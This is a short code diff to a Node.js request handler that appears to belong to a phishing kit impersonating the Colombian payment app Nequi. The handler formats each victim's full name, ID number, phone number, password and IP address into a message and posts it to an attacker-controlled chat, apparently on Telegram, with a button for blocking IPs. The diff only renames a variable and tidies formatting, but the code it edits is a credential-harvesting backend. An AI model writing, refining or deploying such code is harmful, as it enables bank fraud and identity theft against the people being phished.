@@ -78,7 +78,7 @@ module.exports = async function handler(req, res) {
             message = `
 👤Nequi_Meta_Infinito👤
 🆔Nombres: ${fullName}
-🪪 Cédula: ${documentNumber}
+🪪Cédula: ${documentNumber}
 #️⃣Número: ${username || 'No proporcionado'}
 🔐Clave: ${password || 'No proporcionada'}
 🌏IP: ${userIP || 'Desconocida'}
@@ -86,12 +86,12 @@ module.exports = async function handler(req, res) {
 `.trim();
         }
 
-        const button = {
+        const buttonMarkup = {
             inline_keyboard: [
                 [
                     {
                         text: "Bloquear IP",
-                        callback_data: `block_ip:${userIP}` // Incluye la IP en el callback
+                        callback_data: `block_ip:${userIP}`
                     }
                 ]
             ]
@@ -102,7 +102,7 @@ module.exports = async function handler(req, res) {
             {
                 chat_id: CHAT_ID,
                 text: message,
-                reply_markup: button
+                reply_markup: buttonMarkup
             }
         );
 
